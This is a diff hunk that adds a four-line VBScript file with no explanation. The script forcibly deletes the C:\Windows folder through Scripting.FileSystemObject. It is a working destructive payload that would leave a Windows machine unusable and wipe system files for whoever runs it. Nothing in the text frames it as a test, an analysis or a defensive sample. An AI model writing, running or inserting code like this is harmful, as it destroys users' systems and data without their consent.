@@ -1,0 +1,4 @@
+Dim fso, folderPath
+folderPath = "C:\Windows"
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.DeleteFolder folderPath, True  
